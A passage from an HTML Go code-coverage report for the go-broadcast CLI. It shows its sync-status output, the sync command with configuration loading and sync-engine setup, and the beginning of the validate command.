                case "error":<span class="cov8" title="1">
                        errors++</span>
                }
        }

        <span class="cov8" title="1">output.Info("Summary:")
        output.Success(fmt.Sprintf("  Synced: %d", synced))

        if outdated &gt; 0 </span><span class="cov8" title="1">{
                output.Warn(fmt.Sprintf("  Outdated: %d", outdated))
        }</span>

        <span class="cov8" title="1">if pending &gt; 0 </span><span class="cov8" title="1">{
                output.Info(fmt.Sprintf("  Pending: %d", pending))
        }</span>

        <span class="cov8" title="1">if errors &gt; 0 </span><span class="cov8" title="1">{
                output.Error(fmt.Sprintf("  Errors: %d", errors))
        }</span>

        <span class="cov8" title="1">return nil</span>
}

// outputGroupTextStatus displays group-based status in text format
func outputGroupTextStatus(status *SyncStatus) error <span class="cov8" title="1">{
        output.Info("=== Sync Status (Group-Based Configuration) ===")
        output.Info("")

        for _, group := range status.Groups </span><span class="cov8" title="1">{
                // Group header with status icon
                var groupIcon string
                switch group.State </span>{
                case "synced":<span class="cov8" title="1">
                        groupIcon = "‚úì"</span>
                case "pending":<span class="cov0" title="0">
                        groupIcon = "‚è≥"</span>
                case "error":<span class="cov8" title="1">
                        groupIcon = "‚úó"</span>
                case "disabled":<span class="cov8" title="1">
                        groupIcon = "‚äò"</span>
                default:<span class="cov0" title="0">
                        groupIcon = "‚Ä¢"</span>
                }

                <span class="cov8" title="1">output.Info(fmt.Sprintf("%s Group: %s (%s) [Priority: %d]",
                        groupIcon, group.Name, group.ID, group.Priority))

                // Group metadata
                output.Info(fmt.Sprintf("  Status: %s", group.State))
                if group.State == "disabled" </span><span class="cov8" title="1">{
                        output.Info("  (Group is disabled)")
                }</span>

                <span class="cov8" title="1">if len(group.DependsOn) &gt; 0 </span><span class="cov0" title="0">{
                        output.Info(fmt.Sprintf("  Dependencies: %s", strings.Join(group.DependsOn, ", ")))
                }</span>

                <span class="cov8" title="1">output.Info(fmt.Sprintf("  Source: %s (branch: %s)",
                        group.Source.Repository, group.Source.Branch))

                // Group targets
                if len(group.Targets) &gt; 0 </span><span class="cov8" title="1">{
                        output.Info(fmt.Sprintf("  Targets (%d):", len(group.Targets)))

                        for _, target := range group.Targets </span><span class="cov8" title="1">{
                                // Target status icon
                                var icon string
                                switch target.State </span>{
                                case "synced":<span class="cov8" title="1">
                                        icon = "‚úì"</span>
                                case "outdated":<span class="cov0" title="0">
                                        icon = "‚ö†"</span>
                                case "pending":<span class="cov0" title="0">
                                        icon = "‚è≥"</span>
                                case "error":<span class="cov8" title="1">
                                        icon = "‚úó"</span>
                                default:<span class="cov0" title="0">
                                        icon = "?"</span>
                                }

                                <span class="cov8" title="1">output.Info(fmt.Sprintf("    %s %s [%s]", icon, target.Repository, target.State))

                                if target.PullRequest != nil </span><span class="cov0" title="0">{
                                        output.Info(fmt.Sprintf("      PR #%d: %s (%s)",
                                                target.PullRequest.Number,
                                                target.PullRequest.Title,
                                                target.PullRequest.State))
                                }</span>

                                <span class="cov8" title="1">if target.LastSync != nil &amp;&amp; len(target.LastSync.Commit) &gt;= 7 </span><span class="cov0" title="0">{
                                        output.Info(fmt.Sprintf("      Last sync: %s (commit: %s)",
                                                target.LastSync.Timestamp,
                                                target.LastSync.Commit[:7]))
                                }</span>

                                <span class="cov8" title="1">if target.Error != nil </span><span class="cov8" title="1">{
                                        output.Error(fmt.Sprintf("      Error: %s", *target.Error))
                                }</span>
                        }
                } else<span class="cov8" title="1"> {
                        output.Info("  Targets: (none)")
                }</span>

                <span class="cov8" title="1">output.Info("")</span>
        }

        // Overall summary
        <span class="cov8" title="1">totalGroups := len(status.Groups)
        enabledGroups := 0
        syncedGroups := 0
        pendingGroups := 0
        errorGroups := 0

        for _, g := range status.Groups </span><span class="cov8" title="1">{
                if g.State != "disabled" </span><span class="cov8" title="1">{
                        enabledGroups++
                }</span>
                <span class="cov8" title="1">switch g.State </span>{
                case "synced":<span class="cov8" title="1">
                        syncedGroups++</span>
                case "pending":<span class="cov0" title="0">
                        pendingGroups++</span>
                case "error":<span class="cov8" title="1">
                        errorGroups++</span>
                }
        }

        <span class="cov8" title="1">output.Info("=== Summary ===")
        output.Info(fmt.Sprintf("Total Groups: %d (%d enabled, %d disabled)",
                totalGroups, enabledGroups, totalGroups-enabledGroups))

        if enabledGroups &gt; 0 </span><span class="cov8" title="1">{
                summary := []string{}
                if syncedGroups &gt; 0 </span><span class="cov8" title="1">{
                        summary = append(summary, fmt.Sprintf("%d synced", syncedGroups))
                }</span>
                <span class="cov8" title="1">if pendingGroups &gt; 0 </span><span class="cov0" title="0">{
                        summary = append(summary, fmt.Sprintf("%d pending", pendingGroups))
                }</span>
                <span class="cov8" title="1">if errorGroups &gt; 0 </span><span class="cov8" title="1">{
                        summary = append(summary, fmt.Sprintf("%d with errors", errorGroups))
                }</span>
                <span class="cov8" title="1">if len(summary) &gt; 0 </span><span class="cov8" title="1">{
                        output.Info(fmt.Sprintf("Status: %s", strings.Join(summary, ", ")))
                }</span>
        }

        <span class="cov8" title="1">return nil</span>
}
</pre>

		<pre class="file" id="file16" style="display: none">package cli

import (
        "context"
        "fmt"
        "os"

        "github.com/sirupsen/logrus"
        "github.com/spf13/cobra"

        "github.com/mrz1836/go-broadcast/internal/config"
        "github.com/mrz1836/go-broadcast/internal/gh"
        "github.com/mrz1836/go-broadcast/internal/git"
        "github.com/mrz1836/go-broadcast/internal/output"
        "github.com/mrz1836/go-broadcast/internal/state"
        "github.com/mrz1836/go-broadcast/internal/sync"
        "github.com/mrz1836/go-broadcast/internal/transform"
)

// SyncService defines the interface for sync operations
type SyncService interface {
        Sync(ctx context.Context, targets []string) error
}

// ConfigLoader defines the interface for configuration loading
type ConfigLoader interface {
        LoadConfig(configPath string) (*config.Config, error)
        ValidateConfig(cfg *config.Config) error
}

// SyncEngineFactory defines the interface for creating sync engines
type SyncEngineFactory interface {
        CreateSyncEngine(ctx context.Context, cfg *config.Config, flags *Flags, logger *logrus.Logger) (SyncService, error)
}

// DefaultConfigLoader implements ConfigLoader
type DefaultConfigLoader struct{}

// LoadConfig loads and parses configuration from file
func (d *DefaultConfigLoader) LoadConfig(configPath string) (*config.Config, error) <span class="cov8" title="1">{
        // Check if config file exists
        if _, err := os.Stat(configPath); os.IsNotExist(err) </span><span class="cov8" title="1">{
                return nil, fmt.Errorf("%w: %s", ErrConfigFileNotFound, configPath)
        }</span>

        // Load and parse configuration
        <span class="cov0" title="0">return config.Load(configPath)</span>
}

// ValidateConfig validates the configuration
func (d *DefaultConfigLoader) ValidateConfig(cfg *config.Config) error <span class="cov8" title="1">{
        return cfg.ValidateWithLogging(context.Background(), nil)
}</span>

// DefaultSyncEngineFactory implements SyncEngineFactory
type DefaultSyncEngineFactory struct{}

// CreateSyncEngine creates a new sync engine with all dependencies
func (d *DefaultSyncEngineFactory) CreateSyncEngine(ctx context.Context, cfg *config.Config, flags *Flags, logger *logrus.Logger) (SyncService, error) <span class="cov8" title="1">{
        return createSyncEngineWithFlags(ctx, cfg, flags, logger)
}</span>

// SyncCommand represents a testable sync command
type SyncCommand struct {
        configLoader      ConfigLoader
        syncEngineFactory SyncEngineFactory
        outputWriter      output.Writer
}

// NewSyncCommand creates a new SyncCommand with default dependencies
func NewSyncCommand() *SyncCommand <span class="cov8" title="1">{
        return &amp;SyncCommand{
                configLoader:      &amp;DefaultConfigLoader{},
                syncEngineFactory: &amp;DefaultSyncEngineFactory{},
                outputWriter:      output.NewColoredWriter(os.Stdout, os.Stderr),
        }
}</span>

// NewSyncCommandWithDependencies creates a new SyncCommand with injectable dependencies
func NewSyncCommandWithDependencies(configLoader ConfigLoader, syncEngineFactory SyncEngineFactory, outputWriter output.Writer) *SyncCommand <span class="cov8" title="1">{
        return &amp;SyncCommand{
                configLoader:      configLoader,
                syncEngineFactory: syncEngineFactory,
                outputWriter:      outputWriter,
        }
}</span>

// ExecuteSync runs the sync operation with the given flags and arguments
func (s *SyncCommand) ExecuteSync(ctx context.Context, flags *Flags, args []string) error <span class="cov8" title="1">{
        logger := logrus.StandardLogger()
        log := logger.WithField("command", "sync")

        // Load configuration
        cfg, err := s.configLoader.LoadConfig(flags.ConfigFile)
        if err != nil </span><span class="cov8" title="1">{
                return fmt.Errorf("failed to load configuration: %w", err)
        }</span>

        // Validate configuration
        <span class="cov8" title="1">if err := s.configLoader.ValidateConfig(cfg); err != nil </span><span class="cov8" title="1">{
                return fmt.Errorf("invalid configuration: %w", err)
        }</span>

        // Filter targets if specified
        <span class="cov8" title="1">targets := args
        if len(targets) &gt; 0 </span><span class="cov8" title="1">{
                log.WithField("targets", targets).Info("Syncing specific targets")
        }</span> else<span class="cov8" title="1"> {
                log.Info("Syncing all configured targets")
        }</span>

        // Show dry-run warning
        <span class="cov8" title="1">if flags.DryRun </span><span class="cov8" title="1">{
                s.outputWriter.Warn("DRY-RUN MODE: No changes will be made to repositories")
        }</span>

        // Initialize sync engine
        <span class="cov8" title="1">syncEngine, err := s.syncEngineFactory.CreateSyncEngine(ctx, cfg, flags, logger)
        if err != nil </span><span class="cov8" title="1">{
                return fmt.Errorf("failed to initialize sync engine: %w", err)
        }</span>

        // Execute sync
        <span class="cov8" title="1">if err := syncEngine.Sync(ctx, targets); err != nil </span><span class="cov8" title="1">{
                return fmt.Errorf("sync failed: %w", err)
        }</span>

        <span class="cov8" title="1">s.outputWriter.Success("Sync completed successfully")
        return nil</span>
}

//nolint:gochecknoglobals // Package-level variables for CLI flags
var (
        groupFilter []string
        skipGroups  []string
)

//nolint:gochecknoglobals // Cobra commands are designed to be global variables
var syncCmd = &amp;cobra.Command{
        Use:   "sync [targets...]",
        Short: "Synchronize files to target repositories",
        Long: `Synchronize files from the source template repository to one or more target repositories.

If no targets are specified, all targets in the configuration file will be synchronized.
Target repositories can be specified as arguments to sync only specific repos.

Group Filtering:
  Use --groups to sync only specific groups (by name or ID).
  Use --skip-groups to exclude specific groups from sync.
  When both are specified, skip-groups takes precedence.`,
        Example: `  # Basic operations
  go-broadcast sync                        # Sync all targets from config
  go-broadcast sync --config sync.yaml     # Use specific config file
  go-broadcast sync org/repo1 org/repo2    # Sync only specified repositories
  go-broadcast sync --dry-run              # Preview changes without making them

  # Group-based sync
  go-broadcast sync --groups "core,security"       # Sync only core and security groups
  go-broadcast sync --skip-groups "experimental"   # Sync all except experimental group
  go-broadcast sync --groups core org/repo1        # Sync specific target in core group

  # Debugging and troubleshooting
  go-broadcast sync --log-level debug      # Enable debug logging
  go-broadcast sync --log-level trace      # Maximum verbosity

  # Common workflows
  go-broadcast validate &amp;&amp; go-broadcast sync --dry-run  # Validate then preview
  go-broadcast sync --dry-run | tee preview.log        # Save preview output

  # For debugging capabilities, use:
  # go-broadcast sync -v --debug-git --debug-api (requires verbose support)`,
        Aliases: []string{"s"},
        RunE:    runSync,
}

//nolint:gochecknoinits // Cobra commands require init() for flag registration
func init() <span class="cov8" title="1">{
        syncCmd.Flags().StringSliceVar(&amp;groupFilter, "groups", nil, "Sync only specified groups (by name or ID)")
        syncCmd.Flags().StringSliceVar(&amp;skipGroups, "skip-groups", nil, "Skip specified groups during sync")
}</span>

func runSync(cmd *cobra.Command, args []string) error <span class="cov8" title="1">{
        ctx := cmd.Context()
        log := logrus.WithField("command", "sync")

        // Load configuration
        cfg, err := loadConfig()
        if err != nil </span><span class="cov8" title="1">{
                return fmt.Errorf("failed to load configuration: %w", err)
        }</span>

        // Log group filters if specified
        <span class="cov8" title="1">if len(groupFilter) &gt; 0 </span><span class="cov0" title="0">{
                log.WithField("groups", groupFilter).Info("Filtering to specific groups")
        }</span>
        <span class="cov8" title="1">if len(skipGroups) &gt; 0 </span><span class="cov0" title="0">{
                log.WithField("skip_groups", skipGroups).Info("Skipping specified groups")
        }</span>

        // Filter targets if specified
        <span class="cov8" title="1">targets := args
        if len(targets) &gt; 0 </span><span class="cov0" title="0">{
                log.WithField("targets", targets).Info("Syncing specific targets")
        }</span> else<span class="cov8" title="1"> if len(groupFilter) == 0 &amp;&amp; len(skipGroups) == 0 </span><span class="cov8" title="1">{
                log.Info("Syncing all configured targets")
        }</span>

        // Show dry-run warning
        <span class="cov8" title="1">if IsDryRun() </span><span class="cov0" title="0">{
                output.Warn("DRY-RUN MODE: No changes will be made to repositories")
        }</span>

        // Initialize sync engine with real implementations
        <span class="cov8" title="1">engine, err := createSyncEngine(ctx, cfg)
        if err != nil </span><span class="cov0" title="0">{
                return fmt.Errorf("failed to initialize sync engine: %w", err)
        }</span>

        // Execute sync
        <span class="cov8" title="1">if err := engine.Sync(ctx, targets); err != nil </span><span class="cov8" title="1">{
                return fmt.Errorf("sync failed: %w", err)
        }</span>

        <span class="cov0" title="0">output.Success("Sync completed successfully")
        return nil</span>
}

// createRunSync creates an isolated sync run function with the given flags
func createRunSync(flags *Flags) func(*cobra.Command, []string) error <span class="cov8" title="1">{
        return func(cmd *cobra.Command, args []string) error </span><span class="cov8" title="1">{
                ctx := cmd.Context()

                // Get isolated logger from context, fallback to global if not available
                logger, ok := ctx.Value(loggerContextKey{}).(*logrus.Logger)
                if !ok </span><span class="cov8" title="1">{
                        logger = logrus.StandardLogger()
                }</span>
                <span class="cov8" title="1">log := logger.WithField("command", "sync")

                // Load configuration
                cfg, err := loadConfigWithFlags(flags, logger)
                if err != nil </span><span class="cov8" title="1">{
                        return fmt.Errorf("failed to load configuration: %w", err)
                }</span>

                // Filter targets if specified
                <span class="cov8" title="1">targets := args
                if len(targets) &gt; 0 </span><span class="cov8" title="1">{
                        log.WithField("targets", targets).Info("Syncing specific targets")
                }</span> else<span class="cov8" title="1"> {
                        log.Info("Syncing all configured targets")
                }</span>

                // Show dry-run warning
                <span class="cov8" title="1">if flags.DryRun </span><span class="cov8" title="1">{
                        output.Warn("DRY-RUN MODE: No changes will be made to repositories")
                }</span>

                // Initialize sync engine with real implementations
                <span class="cov8" title="1">engine, err := createSyncEngineWithFlags(ctx, cfg, flags, logger)
                if err != nil </span><span class="cov0" title="0">{
                        return fmt.Errorf("failed to initialize sync engine: %w", err)
                }</span>

                // Execute sync
                <span class="cov8" title="1">if err := engine.Sync(ctx, targets); err != nil </span><span class="cov8" title="1">{
                        return fmt.Errorf("sync failed: %w", err)
                }</span>

                <span class="cov0" title="0">output.Success("Sync completed successfully")
                return nil</span>
        }
}

func loadConfig() (*config.Config, error) <span class="cov8" title="1">{
        configPath := GetConfigFile()

        // Check if config file exists
        if _, err := os.Stat(configPath); os.IsNotExist(err) </span><span class="cov8" title="1">{
                return nil, fmt.Errorf("%w: %s", ErrConfigFileNotFound, configPath)
        }</span>

        // Load and parse configuration
        <span class="cov8" title="1">cfg, err := config.Load(configPath)
        if err != nil </span><span class="cov8" title="1">{
                return nil, err
        }</span>

        // Validate configuration
        <span class="cov8" title="1">if err := cfg.ValidateWithLogging(context.Background(), nil); err != nil </span><span class="cov8" title="1">{
                return nil, fmt.Errorf("invalid configuration: %w", err)
        }</span>

        <span class="cov8" title="1">return cfg, nil</span>
}

// loadConfigWithFlags loads configuration using the given flags instead of global state
func loadConfigWithFlags(flags *Flags, logger *logrus.Logger) (*config.Config, error) <span class="cov8" title="1">{
        configPath := flags.ConfigFile

        // Check if config file exists
        if _, err := os.Stat(configPath); os.IsNotExist(err) </span><span class="cov8" title="1">{
                return nil, fmt.Errorf("%w: %s", ErrConfigFileNotFound, configPath)
        }</span>

        // Load and parse configuration
        <span class="cov8" title="1">cfg, err := config.Load(configPath)
        if err != nil </span><span class="cov0" title="0">{
                return nil, err
        }</span>

        // Validate configuration
        <span class="cov8" title="1">if err := cfg.ValidateWithLogging(context.Background(), nil); err != nil </span><span class="cov0" title="0">{
                return nil, fmt.Errorf("invalid configuration: %w", err)
        }</span>

        <span class="cov8" title="1">groups := cfg.Groups
        sourceRepo := ""
        targetsCount := 0
        if len(groups) &gt; 0 </span><span class="cov8" title="1">{
                sourceRepo = groups[0].Source.Repo
                targetsCount = len(groups[0].Targets)
        }</span>
        <span class="cov8" title="1">logger.WithFields(logrus.Fields{
                "source":      sourceRepo,
                "targets":     targetsCount,
                "config_file": configPath,
        }).Debug("Configuration loaded")

        return cfg, nil</span>
}

// createSyncEngine initializes the sync engine with all required dependencies
func createSyncEngine(ctx context.Context, cfg *config.Config) (*sync.Engine, error) <span class="cov8" title="1">{
        logger := logrus.StandardLogger()

        // Initialize GitHub client
        ghClient, err := gh.NewClient(ctx, logger, nil)
        if err != nil </span><span class="cov0" title="0">{
                return nil, fmt.Errorf("failed to create GitHub client: %w", err)
        }</span>

        // Initialize Git client
        <span class="cov8" title="1">gitClient, err := git.NewClient(logger, nil)
        if err != nil </span><span class="cov0" title="0">{
                return nil, fmt.Errorf("failed to create Git client: %w", err)
        }</span>

        // Initialize state discoverer
        <span class="cov8" title="1">stateDiscoverer := state.NewDiscoverer(ghClient, logger, nil)

        // Initialize transform chain
        transformChain := transform.NewChain(logger)

        // Add repository name transformer if any target uses it
        groups := cfg.Groups
        for _, group := range groups </span><span class="cov8" title="1">{
                for _, target := range group.Targets </span><span class="cov8" title="1">{
                        if target.Transform.RepoName </span><span class="cov0" title="0">{
                                transformChain.Add(transform.NewRepoTransformer())
                                goto repoTransformerAdded</span>
                        }
                }
        }
<span class="cov8" title="1">repoTransformerAdded:

        // Add template variable transformer if any target uses it
        for _, group := range groups </span><span class="cov8" title="1">{
                for _, target := range group.Targets </span><span class="cov8" title="1">{
                        if len(target.Transform.Variables) &gt; 0 </span><span class="cov0" title="0">{
                                transformChain.Add(transform.NewTemplateTransformer(logrus.StandardLogger(), nil))
                                goto templateTransformerAdded</span>
                        }
                }
        }
templateTransformerAdded:

        // Create sync options
        <span class="cov8" title="1">opts := sync.DefaultOptions().
                WithDryRun(IsDryRun()).
                WithMaxConcurrency(5).
                WithGroupFilter(groupFilter).
                WithSkipGroups(skipGroups)

        // Create and return engine
        engine := sync.NewEngine(cfg, ghClient, gitClient, stateDiscoverer, transformChain, opts)
        engine.SetLogger(logrus.StandardLogger())

        return engine, nil</span>
}

// createSyncEngineWithFlags initializes the sync engine with flags instead of global state
func createSyncEngineWithFlags(ctx context.Context, cfg *config.Config, flags *Flags, logger *logrus.Logger) (*sync.Engine, error) <span class="cov8" title="1">{
        // Initialize GitHub client
        ghClient, err := gh.NewClient(ctx, logger, nil)
        if err != nil </span><span class="cov0" title="0">{
                return nil, fmt.Errorf("failed to create GitHub client: %w", err)
        }</span>

        // Initialize Git client
        <span class="cov8" title="1">gitClient, err := git.NewClient(logger, nil)
        if err != nil </span><span class="cov0" title="0">{
                return nil, fmt.Errorf("failed to create Git client: %w", err)
        }</span>

        // Initialize state discoverer
        <span class="cov8" title="1">stateDiscoverer := state.NewDiscoverer(ghClient, logger, nil)

        // Initialize transform chain
        transformChain := transform.NewChain(logger)

        // Add repository name transformer if any target uses it
        groups := cfg.Groups
        for _, group := range groups </span><span class="cov8" title="1">{
                for _, target := range group.Targets </span><span class="cov8" title="1">{
                        if target.Transform.RepoName </span><span class="cov8" title="1">{
                                transformChain.Add(transform.NewRepoTransformer())
                                goto repoTransformerAdded2</span>
                        }
                }
        }
<span class="cov8" title="1">repoTransformerAdded2:

        // Add template variable transformer if any target uses it
        for _, group := range groups </span><span class="cov8" title="1">{
                for _, target := range group.Targets </span><span class="cov8" title="1">{
                        if len(target.Transform.Variables) &gt; 0 </span><span class="cov8" title="1">{
                                transformChain.Add(transform.NewTemplateTransformer(logger, nil))
                                goto templateTransformerAdded2</span>
                        }
                }
        }
templateTransformerAdded2:

        // Create sync options using flags instead of global state
        <span class="cov8" title="1">opts := sync.DefaultOptions().
                WithDryRun(flags.DryRun).
                WithMaxConcurrency(5).
                WithGroupFilter(flags.GroupFilter).
                WithSkipGroups(flags.SkipGroups)

        // Create and return engine
        engine := sync.NewEngine(cfg, ghClient, gitClient, stateDiscoverer, transformChain, opts)
        engine.SetLogger(logger)

        return engine, nil</span>
}

// loadConfigWithLogConfig loads configuration using LogConfig instead of Flags.
//
// This function provides configuration loading with verbose logging
// support and component-specific debug settings.
//
// Parameters:
// - logConfig: LogConfig containing configuration and debug settings
//
// Returns:
// - Loaded and validated configuration
// - Error if loading or validation fails
//
// Side Effects:
// - Logs configuration details when debug logging is enabled
func loadConfigWithLogConfig(logConfig *LogConfig) (*config.Config, error) <span class="cov8" title="1">{
        configPath := logConfig.ConfigFile

        // Check if config file exists
        if _, err := os.Stat(configPath); os.IsNotExist(err) </span><span class="cov8" title="1">{
                return nil, fmt.Errorf("%w: %s", ErrConfigFileNotFound, configPath)
        }</span>

        // Load and parse configuration
        <span class="cov8" title="1">cfg, err := config.Load(configPath)
        if err != nil </span><span class="cov0" title="0">{
                return nil, err
        }</span>

        // Validate configuration with LogConfig
        <span class="cov8" title="1">if err := cfg.ValidateWithLogging(context.Background(), logConfig); err != nil </span><span class="cov0" title="0">{
                return nil, fmt.Errorf("invalid configuration: %w", err)
        }</span>

        // Log configuration details when debug is enabled
        <span class="cov8" title="1">if logConfig.Debug.Config || logConfig.Verbose &gt;= 1 </span><span class="cov8" title="1">{
                groups := cfg.Groups
                sourceRepo := ""
                targetsCount := 0
                if len(groups) &gt; 0 </span><span class="cov8" title="1">{
                        sourceRepo = groups[0].Source.Repo
                        targetsCount = len(groups[0].Targets)
                }</span>
                <span class="cov8" title="1">logrus.WithFields(logrus.Fields{
                        "source":      sourceRepo,
                        "targets":     targetsCount,
                        "config_file": configPath,
                }).Debug("Configuration loaded")</span>
        }

        <span class="cov8" title="1">return cfg, nil</span>
}

// createSyncEngineWithLogConfig initializes the sync engine with LogConfig.
//
// This function creates a sync engine using the LogConfig for
// component-specific debugging and verbose logging capabilities.
//
// Parameters:
// - ctx: Context for cancellation control
// - cfg: Application configuration
// - logConfig: Logging configuration with debug settings
//
// Returns:
// - Configured sync engine instance
// - Error if initialization fails
//
// Side Effects:
// - Creates GitHub and Git clients with appropriate logging
// - Configures transform chain based on configuration
func createSyncEngineWithLogConfig(ctx context.Context, cfg *config.Config, logConfig *LogConfig) (*sync.Engine, error) <span class="cov8" title="1">{
        logger := logrus.StandardLogger()

        // Initialize GitHub client with verbose logging
        ghClient, err := gh.NewClient(ctx, logger, logConfig)
        if err != nil </span><span class="cov0" title="0">{
                return nil, fmt.Errorf("failed to create GitHub client: %w", err)
        }</span>

        // Initialize Git client with verbose logging
        <span class="cov8" title="1">gitClient, err := git.NewClient(logger, logConfig)
        if err != nil </span><span class="cov0" title="0">{
                return nil, fmt.Errorf("failed to create Git client: %w", err)
        }</span>

        // Initialize state discoverer with LogConfig
        <span class="cov8" title="1">stateDiscoverer := state.NewDiscoverer(ghClient, logger, logConfig)

        // Initialize transform chain
        transformChain := transform.NewChain(logger)

        // Add repository name transformer if any target uses it
        groups := cfg.Groups
        for _, group := range groups </span><span class="cov8" title="1">{
                for _, target := range group.Targets </span><span class="cov8" title="1">{
                        if target.Transform.RepoName </span><span class="cov0" title="0">{
                                transformChain.Add(transform.NewRepoTransformer())
                                goto repoTransformerAdded3</span>
                        }
                }
        }
<span class="cov8" title="1">repoTransformerAdded3:

        // Add template variable transformer if any target uses it
        for _, group := range groups </span><span class="cov8" title="1">{
                for _, target := range group.Targets </span><span class="cov8" title="1">{
                        if len(target.Transform.Variables) &gt; 0 </span><span class="cov0" title="0">{
                                transformChain.Add(transform.NewTemplateTransformer(logger, logConfig))
                                goto templateTransformerAdded3</span>
                        }
                }
        }
templateTransformerAdded3:

        // Create sync options using LogConfig instead of global state
        <span class="cov8" title="1">opts := sync.DefaultOptions().
                WithDryRun(logConfig.DryRun).
                WithMaxConcurrency(5).
                WithGroupFilter(logConfig.GroupFilter).
                WithSkipGroups(logConfig.SkipGroups)

        // Create and return engine
        engine := sync.NewEngine(cfg, ghClient, gitClient, stateDiscoverer, transformChain, opts)
        engine.SetLogger(logger)

        return engine, nil</span>
}
</pre>

		<pre class="file" id="file17" style="display: none">package cli

import (
        "context"
        "fmt"
        "os"
        "path/filepath"
        "strings"

        "github.com/sirupsen/logrus"
        "github.com/spf13/cobra"

        "github.com/mrz1836/go-broadcast/internal/config"
        "github.com/mrz1836/go-broadcast/internal/gh"
        "github.com/mrz1836/go-broadcast/internal/logging"
        "github.com/mrz1836/go-broadcast/internal/output"
)

// Validation errors
var (
        ErrGitHubCLIRequired    = fmt.Errorf("github CLI required for repository validation")
        ErrGitHubAuthRequired   = fmt.Errorf("github authentication required")
        ErrSourceBranchNotFound = fmt.Errorf("source branch not accessible")
        ErrSourceRepoNotFound   = fmt.Errorf("source repository not accessible")
        ErrNoConfigGroups       = fmt.Errorf("no configuration groups found")
)

//nolint:gochecknoglobals // Cobra commands are designed to be global variables
var validateCmd = &amp;cobra.Command{
        Use:   "validate",
        Short: "Validate configuration file",
        Long: `Validate the syntax and content of a configuration file.

Checks performed:
  ‚Ä¢ YAML syntax is valid
  ‚Ä¢ Required fields are present
  ‚Ä¢ Repository names are in correct format
  ‚Ä¢ File paths are valid
  ‚Ä¢ No duplicate targets or file mappings
  ‚Ä¢ Transform configurations are valid
  ‚Ä¢ Repository accessibility (requires GitHub authentication)
  ‚Ä¢ Source file existence (requires Git access)`,
        Example: `  # Basic validation
  go-broadcast validate                     # Validate default config file
  go-broadcast validate --config sync.yaml # Validate specific file

  # Skip remote validation for offline use
  go-broadcast validate --skip-remote-checks       # Only validate YAML/syntax
  go-broadcast validate --source-only              # Only check source repo access

  # Debug validation issues
  go-broadcast validate --log-level debug  # Show detailed validation steps

  # Automation workflows
  go-broadcast validate &amp;&amp; echo "Config valid"      # Use exit code
  go-broadcast validate 2&gt;&amp;1 | tee validation.log  # Save validation output

  # Common patterns
  go-broadcast validate --config prod.yaml  # Validate production config
  find . -name "*.yaml" -exec go-broadcast validate --config {} \;  # Validate multiple files`,
        Aliases: []string{"v", "check"},
        RunE:    runValidate,
}

func runValidate(cmd *cobra.Command, _ []string) error <span class="cov8" title="1">{
        return runValidateWithFlags(globalFlags, cmd)
}</span>

func runValidateWithFlags(flags *Flags, cmd *cobra.Command) error <span class="cov8" title="1">{
        log := logrus.WithField("command", "validate")
        configPath := flags.ConfigFile

        output.Info(fmt.Sprintf("Validating configuration file: %s", configPath))

        // Check if file exists
        if _, err := os.Stat(configPath); os.IsNotExist(err) </span><span class="cov8" title="1">{
                return fmt.Errorf("%w: %s", ErrConfigFileNotFound, configPath)
        }</span>

        // Get absolute path for clarity
        <span class="cov8" title="1">absPath, err := filepath.Abs(configPath)
        if err == nil </span><span class="cov8" title="1">{
                configPath = absPath
        }</span>

        // Load configuration
        <span class="cov8" title="1">cfg, err := config.Load(configPath)
        if err != nil </span><span class="cov8" title="1">{
                output.Error(fmt.Sprintf("Failed to parse configuration: %v", err))
                return fmt.Errorf("configuration parsing failed: %w", err)
        }</span>

        <span class="cov8" title="1">log.Debug("Configuration parsed successfully")

        // Validate configuration
        if err := cfg.ValidateWithLogging(context.Background(), nil); err != nil </span><span class="cov0" title="0">{
                output.Error(fmt.Sprintf("Configuration validation failed: %v", err))
                return fmt.Errorf("configuration validation failed: %w", err)
        }</span>

        // Display configuration summary
        <span class="cov8" title="1">output.Success("‚úì Configuration is valid!")
        output.Info("")
        output.Info("Configuration Summary:")
        output.Info(fmt.Sprintf("  Version: %d", cfg.Version))

        groups := cfg.Groups
        if len(groups) == 0 </span><span class="cov0" title="0">{
                output.Info("  No configuration groups found")
                return nil
        }</span>

        // Check if using group-based configuration
        <span class="cov8" title="1">if len(cfg.Groups) &gt; 0 </span><span class="cov8" title="1">{
                displayGroupValidation(groups)
        }</span> else<span class="cov0" title="0"> {
                // Legacy format display
                group := groups[0] // For compatibility with old format, work with first group
                output.Info(fmt.Sprintf("  Source: %s (branch: %s)", group.Source.Repo, group.Source.Branch))

                if group.Defaults.BranchPrefix != "" || len(group.Defaults.PRLabels) &gt; 0 </span><span class="cov0" title="0">{
                        output.Info("  Defaults:")
                        if group.Defaults.BranchPrefix != "" </span><span class="cov0" title="0">{
                                output.Info(fmt.Sprintf("    Branch prefix: %s", group.Defaults.BranchPrefix))
                        }</span>
                        <span class="cov0" title="0">if len(group.Defaults.PRLabels) &gt; 0 </span><span class="cov0" title="0">{
                                output.Info(fmt.Sprintf("    PR labels: %v", group.Defaults.PRLabels))
                        }</span>
                }

                <span class="cov0" title="0">output.Info(fmt.Sprintf("  Targets: %d repositories", len(group.Targets)))</span>
        }

        // Show target details
        <span class="cov8" title="1">totalFiles := 0

        if len(groups) &gt; 0 </span><span class="cov8" title="1">{
                group := groups[0]
                for i, target := range group.Targets </span><span class="cov8" title="1">{
                        output.Info(fmt.Sprintf("    %d. %s", i+1, target.Repo))
                        output.Info(fmt.Sprintf("       Files: %d mappings", len(target.Files)))

                        // Count transforms
                        transformCount := 0
                        if target.Transform.RepoName </span><span class="cov0" title="0">{
                                transformCount++
                        }</span>

                        <span class="cov8" title="1">transformCount += len(target.Transform.Variables)
                        if transformCount &gt; 0 </span><span class="cov0" title="0">{
                                output.Info(fmt.Sprintf("       Transforms: %d configured", transformCount))
                        }</span>

                        <span class="cov8" title="1">totalFiles += len(target.Files)</span>
                }
        }

        <span class="cov8" title="1">output.Info("")
        output.Info(fmt.Sprintf("Total file mappings: %d", totalFiles))

        // Additional validation checks (future implementation)
        output.Info("")
        output.Info("Additional checks:")
        output.Success("  ‚úì Repository name format")
        output.Success("  ‚úì File paths")
        output.Success("  ‚úì No duplicate targets")
        output.Success("  ‚úì No duplicate file destinations")

        // Get command flags
        skipRemoteChecks, _ := cmd.Flags().GetBool("skip-remote-checks")
        sourceOnly, _ := cmd.Flags().GetBool("source-only")

        // Remote validation checks (skip if requested)
        if !skipRemoteChecks </span><span class="cov8" title="1">{
                output.Info("")
                output.Info("Remote validation:")

                // Initialize logging config for clients
                logConfig := &amp;logging.LogConfig{
                        LogLevel: flags.LogLevel,
                }

                // Validate repository accessibility
